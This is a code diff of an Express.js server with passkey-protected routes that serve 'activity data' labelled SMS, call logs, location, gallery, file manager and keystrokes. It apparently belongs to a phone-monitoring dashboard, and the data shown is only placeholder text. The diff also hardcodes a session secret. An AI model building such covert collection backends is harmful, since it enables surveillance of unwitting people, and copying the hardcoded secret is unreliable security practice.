@@ -1,102 +1,94 @@
 const express = require('express');
-const bodyParser = require('body-parser');
-const cors = require('cors');
 const session = require('express-session');
-const FileStore = require('session-file-store')(session);
-require('dotenv').config();
-
+const cors = require('cors');
+const bodyParser = require('body-parser');
 const app = express();
 
-// Enable CORS with cookies
+// CORS configuration
 app.use(cors({
-    origin: 'https://iosx.vercel.app', // Your frontend URL
-    credentials: true, // Allow cookies to be sent in cross-origin requests
+    origin: 'https://iosx.vercel.app',
+    credentials: true
 }));
-
-app.use(bodyParser.urlencoded({ extended: true }));
-app.use(bodyParser.json());
 
 // Session configuration
 app.use(session({
-    store: new FileStore({ path: './sessions' }),
-    secret: process.env.SESSION_SECRET || 'default_secret',
+    secret: '507402e9bca79ed5711bb5b3cec082b9c9c8846bfe2405dbc8e0da3ca445acc0', // replace with a strong secret in production
     resave: false,
-    saveUninitialized: true,
+    saveUninitialized: false,
     cookie: {
-        secure: true, // Secure cookies for production (HTTPS)
         httpOnly: true,
-        sameSite: 'none', // Required for cross-origin cookies
-        maxAge: 24 * 60 * 60 * 1000, // Session expires in 1 day
-    },
+        secure: true, // Set to true for production
+        sameSite: 'none',
+        maxAge: 24 * 60 * 60 * 1000 // 1 day
+    }
 }));
 
-// Middleware to log each request's session and cookie details
-app.use((req, res, next) => {
-    console.log("Incoming cookies:", req.headers.cookie);
-    console.log("Session ID:", req.sessionID);
-    console.log("Session content:", req.session);
-    next();
-});
+// Body parser for JSON
+app.use(bodyParser.json());
 
 // Your activity tracking data and routes
 const correctPasskey = process.env.PASSKEY || "default_passkey";
 let activityData = {
-    Notifications: '',
-    SMS: '',
-    CallLogs: '',
-    Location: '',
-    SocialMedia: '',
-    GalleryAccess: '',
-    FileManager: '',
-    Keystrokes: ''
+    Notifications: 'Sample notification data',
+    SMS: 'Sample SMS data',
+    CallLogs: 'Sample call log data',
+    Location: 'Sample location data',
+    SocialMedia: 'Sample social media data',
+    GalleryAccess: 'Sample gallery access data',
+    FileManager: 'Sample file manager data',
+    Keystrokes: 'Sample keystrokes data'
 };
 
-// Login endpoint
-app.post('/login', (req, res) => {
+// Authentication route
+app.post('/Login', (req, res) => {
     const { passkey } = req.body;
     if (passkey === correctPasskey) {
         req.session.authenticated = true;
-        console.log("User authenticated, session created.");
-        res.status(200).json({ message: "Login successful" });
+        console.log('User authenticated, session created.');
+        console.log('Session ID:', req.sessionID);
+        res.status(200).json({ message: 'Authenticated' });
     } else {
-        res.status(401).json({ message: "Incorrect passkey" });
+        res.status(401).json({ message: 'Incorrect passkey' });
     }
 });
 
-// Middleware to check if user is authenticated
-function isAuthenticated(req, res, next) {
-    if (req.session && req.session.authenticated) {
-        next();
-    } else {
-        res.status(401).json({ message: "Unauthorized" });
-    }
-}
-
-// Endpoint to check authentication status
+// Check auth status route
 app.get('/auth-status', (req, res) => {
-    console.log("Checking auth status:", req.session.authenticated);
-    res.status(200).json({ authenticated: !!req.session.authenticated });
-});
-
-// Endpoint to fetch activity data for authenticated clients
-app.get('/fetch/:activityType', isAuthenticated, (req, res) => {
-    const { activityType } = req.params;
-    if (activityData[activityType] !== undefined) {
-        res.json({ data: activityData[activityType] || "No data available" });
+    console.log('Checking auth status:', req.session.authenticated);
+    if (req.session.authenticated) {
+        res.json({ authenticated: true });
     } else {
-        res.status(400).json({ message: "Invalid activity type" });
+        res.json({ authenticated: false });
     }
 });
 
-// Logout endpoint
+// Logout route
 app.post('/logout', (req, res) => {
-    req.session.destroy(() => {
-        res.status(200).json({ message: "Logged out" });
+    req.session.destroy(err => {
+        if (err) {
+            return res.status(500).json({ message: 'Logout failed' });
+        }
+        res.clearCookie('connect.sid', {
+            httpOnly: true,
+            secure: true,
+            sameSite: 'none'
+        });
+        res.status(200).json({ message: 'Logged out' });
     });
 });
 
-// Start server
+// Data fetching route
+app.get('/fetch/:activityType', (req, res) => {
+    if (!req.session.authenticated) {
+        return res.status(403).json({ message: 'Unauthorized' });
+    }
+    const activityType = req.params.activityType;
+    const data = activityData[activityType] || `No data available for ${activityType}`;
+    res.json({ data });
+});
+
+// Server listener
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-    console.log(`Server running on http://localhost:${PORT}`);
+    console.log(`Server running on port ${PORT}`);
 });
